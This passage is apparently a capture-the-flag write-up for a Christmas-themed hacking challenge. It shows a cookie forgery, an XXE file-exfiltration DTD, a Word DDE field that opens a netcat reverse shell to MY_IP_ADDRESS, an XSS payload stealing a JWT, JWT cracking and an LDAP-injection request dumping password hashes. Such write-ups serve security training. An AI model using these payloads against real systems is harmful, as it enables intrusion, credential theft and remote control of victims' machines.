        } catch (e) {
            console.log(e);
            return callback(false, '');
        }
    };
{% endhighlight %}

Examining this implementation, we can see that there is a bug whereby we can supply a ciphertext equal in length to the Initialisation Vector (IV) of the cipher, which in the case of AES-256 is 128 bits (or 16 bytes) and the equality check will evaluated to `true` for a zero-length plaintext value.

Hence, all way have to do is modify our cookie, setting the username to the email account we wish to access the inbox for, leave the plaintext value as empty, and set the ciphertext value to 16 arbitrary bytes, base64 encoded. For example, setting our cookie to `{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"AAAAAAAAAAAAAAAAAAAAAA=="}` and refreshing the login page, we are greeted with Alabaster's inbox.

[![center](/images/ewa_alabaster_inbox.png)](/images/ewa_alabaster_inbox.png)

Let this be a lesson; always understand code you find online if you intend to use or adapt it in your own application!

**This is the answer to Question 4: Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?**

Snooping through Alabaster's inbox we find an email from Holly Evergreen with the subject "Lost book page". Inside is [a link](http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf) to page 4 of the Great Book entitled "The Rise of the Lollipop Guild" (SHA1: `f192a884f68af24ae55d9d9ad4adf8d3a3995258`). This page tells us of the tension between the Elves and the Munchkins leading up to the Great Schism, the offensive activities of a group of Munchkins calling themselves the Lollipop guild against the North Pole computer and network infrastructure, and even suggests that the Elves have been infiltrated by Lollipop Guild operatives.

## Naughty and Nice

**This is the answer to first part of Question 5: How many infractions are required to be marked as naughty on Santa's Naughty and Nice list?**

Our first data source is a CSV file from the SMB share we discovered earlier, `Naughty and Nice List.csv` which contains a list of names in the first column, and whether they are considered Naughty or Nice.

Our second data source comes from the North Pole Police Department website, which is publicly accessible at https://nppd.northpolechristmastown.com/. Here, we find an interface for querying infractions. Once a query has been specified, a download link is made available which appends the query parameter `json` with value `1` to the query string. By conducting a query that will return all infractions, such as `title:*` we can download all the infractions in JSON format for easy parsing.

The JSON data is not yet structured in a format which makes it easy to combine with the Naughty and Nice List in order to work out how many infractions are required for someone to be considered Naughty, so we use the `jq` tool to group infractions by the name of the person, aggregating into a count, and exporting as a CSV

    user@machine:~$ jq -r '.infractions | group_by(.name) | .[] | [ .[0].name, (. | length) ] | @csv' infractions.json > infractions_count.csv

Performing a left join of this output with the Naughty and Nice List, we discover that to be considered naughty, one must have four or more infractions.

**Aside from the two insider threat moles Boq Questrian and Bini Aru mentioned in the BOLO Word document from the SMB share, I have yet to figure out how to answer the second part of Question 5: What are the names of at least six insider threat moles?**

## North Pole and Beyond

**This is the answer to the third part of Question 5: Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?**

Back in the North Pole in Beyond, in an NPC conversation with Bumble and Sam, we discover that is is the Abominable Snow Monster who has been throwing the snowballs from the top of the North Pole Mountain. However, all may not be as it seems; according to Sam the Snowman, he Abominable Snow Monster doesn't appear to be acting as himself, and he seems to be under someone else's control. The plot thickens...

## Elf as a Service

**This is the answer to Question 6: The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?**

The Elf as a Service (EaaS) platform is a web application which allows users to upload an XML file defining orders that elves have placed to fulfil Christmas wishes. By following the guidance in an excellent blog post on the SANS Penetration Testing blog, entitled [Exploiting XXE Vulnerabilities in IIS/.NET](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities/) we learn that by hosting malicious XML Document Type Definition (DTD) file on a web server accessible by this application, and uploading an equally malicious XML document using the application's built-in functionality for placing orders, we can read arbitrary files on the remote filesystem. We are told that instructions for acquiring another page of the Great Book are located in `C:\greatboot.txt` on the server.

So, we host the following DTD file on a webserver of our chosing


    <?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
    <!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://MY_IP_ADDRESS:4446/?%stolendata;'>">

and upload the following XML document

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE demo [
         <!ELEMENT demo ANY >
         <!ENTITY % extentity SYSTEM "http://MY_IP_ADDRESS:4445/evil.dtd">
         %extentity;
         %inception;
         %sendit;
          ]
    >

with a netcat listener sitting on port 4446, and we receive the following HTTP request

    GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
    Host: MY_IP_ADDRESS:4446
    Connection: Keep-Alive

Using this information, we navigate to the specified path in our browser and receive page 6 of the Great Book entitled "The Dreaded Inter-Dimensional Tornadoes" (SHA1: `8943e0524e1bf0ea8c7968e85b2444323cb237af`)

## Elf Web Access - phishing attack

Going back to EWA and reading through more of the exchanges there, it seems that Alabaster Snowball is desperate for some of Mrs. Claus's gingerbread cookies. So desperate, in fact, that he claims that he would be willing to download any Microsoft Word docx file that he is sent (in an email on the `mail.northpolechristmastown.com` system containing the phrase "gingerbread cookie recipe"), open it, and click through any prompts that appear. In another email, he also reveals that he is on a workstation with Powershell installed, and netcat in his path. I feel a phishing attack brewing.

To this end, we send him a Word document with a Dynamic Data Exchange (DDE) exploit in it (which, in an email exchange, Minty Candycane later warns him about) containing the following DDEAUTO field `DDEAUTO c:\\windows\\system32\\cmd.exe "/k nc.exe MY_IP_ADDRESS 4445 -e cmd.exe"` which, combined with a netcat listener, gives us a shell on his machine.

Using this, we can exfiltrate page 7 of the Great Book, entitled "Regarding the Witches of Oz" (SHA1: `c1df4dbc96a58b48a9f235a1ca89352f865af8b8`)

## Elf Database

Next, we are asked to penetrate the Elf Database, at `http://edb.northpolechristmastown.com` on the internal network behind the Letters to Santa system. Navigating to this URL, we find another web application protected behind a login page. After trying the obvious combinations derived from credentials we have already discovered on related system, we turn out attention to a support link on the login page from users who have forgotten their username and password.

We are presented with a form that asks for our username, email address, and a message to the support staff. Rudimentary attempts at performing a cross-site scripting (XSS)  attack against the message field under the username `alabaster_snowball` are met with first of all with a helpful validation failure informing us that the format of our username is incorrect and should be of the form `first.last` . How helpful!

Attempting again as `alabaster.snowball` gives us the rather interesting pop-up message containing "Alert, Hacker!", but as it turns out this is just client-side validation which can be bypassed by posting directly to the right endpoint... Almost.

Unfortunately, sending the XSS payload directly to the server shows that there is also some server-side string replacement in place too, for example the string `<script>` gets replaced with `<>`. Consulting with the OWASP cheat sheet for XSS mitagation bypasses, we try a different tact, by sending an `img` tag with its `onerror` attribute set to some Javascript that _will_ execute.

We abuse this to seal the authentication JWT of the user visting the support page (kept in their browser's local storage, from inspecting the web application's source code) by making the following request

    curl "http://edb.northpolechristmastown.com:4003/service" -H "Host: edb.northpolechristmastown.com:4003" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" -H "Accept: */*" -H "Accept-Language: en-GB,en;q=0.5" --compressed -H "Referer: http://edb.northpolechristmastown.com:4003/index.html" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: SESSION=xH8h46s9134Evn5Hgr4Z" -H "Connection: keep-alive" -H "Pragma: no-cache" -H "Cache-Control: no-cache" --data 'uid=alabaster.snowball' --data-urlencode 'email=alabaster.snowball@northpolechristmastown.com'  --resolve edb.northpolechristmastown.com:4003:127.0.0.1 --data-urlencode "message=<img src=x onerror=this.src='http://MY_IP_ADDRESS:4446/?token='+localStorage.getItem('np-auth')>" 

which results in us receiving the following request

    GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
    Referer: http://127.0.0.1/reset_request?ticket=UP4XU-R52T0-I50UF-K868U
    User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
    Accept: */*
    Connection: Keep-Alive
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,*
    Host: MY_IP_ADDRESS:4446

We can now taking the JWT and attempt to recover the secret used to calculate the HMAC-SHA265 signature (after trying the obvious of seeing if their implementation of JWT validation is succeptible of providing the `none` hashing algorithm, which it isn't). After trying and failing to get John the Ripper to do the hard work for us (apparently it's broken on the rolling Kali distribution for this task, after formatting the JWT in a John-friendly format), we resort to [a JWT cracker on Github](https://github.com/brendan-rius/c-jwt-cracker) which does a naive bruteforce over a given character set up to a maximum length for the keyspace.

After a few tens of minutes, the compiled `jwtcrack` binary turns up the secret of `3lv3s`. Using this, we can modifiy this JWT and extend its expiry date into the future.

    ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I

    Secret is "3lv3s"

Inserting this into our local storage and refreshing the page logs us into the Elf Database as `alabaster.snowball`.

Unfortunately, users of the Elf Database are only allowed to query it for information on elves or reindeer (see the LDAP LDIF template below, located at `http://edb.northpolechristmastown.com/dev/LDIF_template.txt` which was found via the site's `robots.txt`.

    dn: dc=com
    dc: com
    objectClass: dcObject

    dn: dc=northpolechristmastown,dc=com
    dc: northpolechristmastown
    objectClass: dcObject
    objectClass: organization

    dn: ou=human,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: human

    dn: ou=elf,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: elf

    dn: ou=reindeer,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: reindeer

    dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
    objectClass: addressbookPerson
    cn: 
    sn: 
    gn: 
    profilePath: /path/to/users/profile/image
    uid: 
    ou: 
    department: 
    mail: 
    telephoneNumber: 
    street:
    postOfficeBox: 
    postalCode: 
    postalAddress: 
    st: 
    l: 
    c: 
    facsimileTelephoneNumber: 
    description: 
    userPassword: 

Noticing that some of the parameters from this form may be being inserted directly into an LDAP query, and combining this information with the very helpful blog post [Understanding and Exploiting Web-based LDAP](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap) we can craft the following request that allows us to fetch every object in `dc=northpolechristmastown,dc=com` and also request the `userPassword` property

    curl "http://edb.northpolechristmastown.com:4003/search" -H "Host: edb.northpolechristmastown.com:4003" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" -H "Accept: */*" -H "Accept-Language: en-GB,en;q=0.5" --compressed -H "Referer: http://edb.northpolechristmastown.com:4003/home.html" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.gr2b8plsmw_JCKbomOUR-E7jLiSMeQ-evyYjcxCPXco" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: SESSION=A4y98fFdt6n3v51cmet8" -H "Connection: keep-alive" --data "name=))(department=*)(|(cn=&isElf=True&attributes=profilePath"%"2Cgn"%"2Csn"%"2Cmail"%"2Cuid"%"2Cdepartment"%"2CtelephoneNumber"%"2Cdescription"

which reveals to us that Santa Claus's userPassword property is `d8b4c05a35b0513f302a85c409b4aab3`. A quick Google search tells us that this is the MD5 hash of the string `001cookielips001`.

**This is the answer to Question 8: Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?**

Using this, we can log into the Elf Database as Santa Claus himself access the Santa Panel, revealing a message containing the following picture of a letter written by The Wizard of Oz himself

[![santa picture center](/images/wizard_of_oz_to_santa_d0t011d408nx.png)](/images/wizard_of_oz_to_santa_d0t011d408nx.png)

## Back to the North Pole and Beyond

**This is the answer to Question 9: Which character is ultimately the villain causing the giant snowball problem. What was the villain's motive?**

Completing the game puzzles, we engage in another NPC conversation where we find out who is truly behind this Christmas misery, Glinda the Good Witch. She confesses that she is responsible for casting a magic spell on the Abominable Snow Monster, in an attempt to make money from the Elf-Munchkin conflict.

> It's me, Glinda the Good Witch of Oz! You found me and ruined my genius plan!
>
> You see, I cast a magic spell on the Abominable Snow Monster to make him throw all the snowballs at the North Pole. Why? Because I knew a giant snowball fight would stir up hostilities between the Elves and the Munchkins, resulting in all-out WAR between Oz and the North Pole. I was going to sell my magic and spells to both sides. War profiteering would mean GREAT business for me.
>
> But, alas, you and your sleuthing foiled my venture. And I would have gotten away with it too, if it weren't for you meddling kids!
